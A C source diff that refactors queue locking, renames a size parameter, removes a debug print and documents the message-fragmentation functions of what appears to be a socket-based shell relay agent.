@@ -50,8 +50,11 @@ static int agent_handle_command(Assembled_Message* a_message){
 	
 	message->size = a_message->last_header.total_size;
 	message->buffer = a_message->message;
+	a_message->message = NULL;
 	
-	enqueue(shell_send_queue, &shell_send_queue_lock, message);
+	pthread_mutex_lock(&shell_send_queue_lock);
+	enqueue(shell_send_queue, message);
+	pthread_mutex_unlock(&shell_send_queue_lock);
 
 	return RET_OK;
 }
@@ -404,7 +407,11 @@ static int agent_handle_message(Assembled_Message* a_message){
 	int retval = RET_OK;
 	Queue_Message* q_message;
 
-	if (!(q_message = dequeue(agent_receive_queue, &agent_receive_queue_lock))) return RET_OK;
+	pthread_mutex_lock(&agent_receive_queue_lock);
+	q_message = dequeue(agent_receive_queue);
+	pthread_mutex_unlock(&agent_receive_queue_lock);
+
+	if (!q_message) return RET_OK;
 	debug_print("taking message off queue: id: %d, size: %d\n", q_message->id, q_message->size);
 
 	// check response from fragment handler
@@ -437,6 +444,13 @@ done:
 	return retval;
 }
 
+/* agent_prepare_response
+Prepare to send a response message out over the socket.
+
+ARGUMENTS
+	id	- the response id
+
+DONE */
 void agent_prepare_response(int id){
 	Queue_Message* q_message;
 	Fragment* fragment;
@@ -451,26 +465,36 @@ void agent_prepare_response(int id){
 	q_message->size = HEADER_SIZE;
 	q_message->fragment = fragment;
 
-	enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
+	pthread_mutex_lock(&agent_send_queue_lock);
+	enqueue(agent_send_queue, q_message);
+	pthread_mutex_unlock(&agent_send_queue_lock);
 }
 
-void agent_prepare_message(int type, char* message, int message_size){
+/* agent_prepare_message
+break the message into fragments and enqueue them to send out over the socket.
+The first message will always be 0 bytes to indicate the next read size.
+
+ARGUMENTS
+	type		- the message type that is being sent
+	message		- the message content
+	m_size		- size of message in bytes
+
+HALFDONE */
+void agent_prepare_message(int type, char* message, int m_size){
 	Queue_Message* q_message;
 	Fragment* fragment;
 	int bytes_sent = 0, index = 0;
 	int this_size, next_size;
-	uint32_t crc = calculate_crc32c(0, (unsigned char*)message, message_size);
-
-	printf("JUJU crc: 0x%x\n", crc);
+	uint32_t crc = calculate_crc32c(0, (unsigned char*)message, m_size);
 
 	// prepare first fragment. Only purpose is to prepare for next fragment size
 	fragment = calloc(1, sizeof(Fragment));
 	fragment->header.type = type;
 	fragment->header.index = index++;
-	fragment->header.total_size = message_size;
+	fragment->header.total_size = m_size;
 	fragment->header.checksum = crc;
 	
-	next_size = message_size < PAYLOAD_SIZE ? message_size : PAYLOAD_SIZE;
+	next_size = m_size < PAYLOAD_SIZE ? m_size : PAYLOAD_SIZE;
 	fragment->header.next_size = next_size;
 	
 	q_message = malloc(sizeof(Queue_Message));
@@ -478,7 +502,8 @@ void agent_prepare_message(int type, char* message, int message_size){
 	q_message->size = HEADER_SIZE;
 	q_message->fragment = fragment;
 
-	enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
+	pthread_mutex_lock(&agent_send_queue_lock);
+	enqueue(agent_send_queue, q_message);
 
 	while (next_size > 0){
 		this_size = next_size;
@@ -487,10 +512,10 @@ void agent_prepare_message(int type, char* message, int message_size){
 		fragment = calloc(1, sizeof(Fragment));
 		fragment->header.type = type;
 		fragment->header.index = index++;
-		fragment->header.total_size = message_size;
+		fragment->header.total_size = m_size;
 		fragment->header.checksum = crc;
 
-		next_size = (message_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (message_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
+		next_size = (m_size - (bytes_sent + next_size)) < PAYLOAD_SIZE ? (m_size - (bytes_sent + next_size)) : PAYLOAD_SIZE;
 		fragment->header.next_size = next_size;
 		memcpy(fragment->buffer, message + bytes_sent, this_size);
 		
@@ -499,9 +524,11 @@ void agent_prepare_message(int type, char* message, int message_size){
 		q_message->size = HEADER_SIZE + this_size;
 		q_message->fragment = fragment;
 
-		enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
+		enqueue(agent_send_queue, q_message);
 		bytes_sent += this_size;
 	}
+
+	pthread_mutex_unlock(&agent_send_queue_lock);
 }
 
 /* agent_handler_thread
